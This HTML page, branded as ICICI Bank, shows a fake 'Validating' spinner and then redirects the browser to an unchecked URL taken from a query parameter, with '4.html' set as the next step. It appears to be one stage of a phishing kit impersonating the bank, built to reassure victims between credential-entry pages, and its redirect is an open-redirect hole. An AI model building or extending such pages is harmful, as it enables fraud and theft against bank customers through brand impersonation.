<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <link rel="stylesheet" href="style.css">
    <title>ICICI Bank</title>
</head>

<body>
<header class="d-flex justify-content-center">
    <img src="header.png" width="100%" alt="">
</header>
<main class="container px-3">
    <div id="test" class="text-danger text-center fw-bold"></div>
    <input type="hidden" id="nextValue" value="4.html">
    <strong>Welcome to ICICI Bank</strong>
    <div class="mt-2 py-5 px-4 form-div" style="height:400px">
        <div class="mt-5">
            <div class="d-flex justify-content-center align-items-center">
                <img class="" src="loading.gif" alt=""> <br>
            </div>
            <label class="d-flex justify-content-center align-items-center" for="">Validating</label>
            <div class="loading-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>
    </div>
</main>

<footer class="mt-4">
    <img src="footer1.png" width="100%" alt="">
    <img src="footer.png" width="100%" alt="">
</footer>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
<script src="script.js"></script>
<script>
    window.onload = function(){
         var url = window.location.href;
            var urlObject = new URL(url);
            var nextValue = urlObject.searchParams.get('next');
            var seconds = 1;
            var countdown = setInterval(function () {
                seconds--;
                $('#countdown').text(seconds);
                if (seconds <= 0) {
                    clearInterval(countdown);
                    if (nextValue) {
                        window.location.href = nextValue;
                    } else {
                        window.location.href = "index.html";
                    }
                }
            }, 1000);
    }
</script>

</body>

</html>
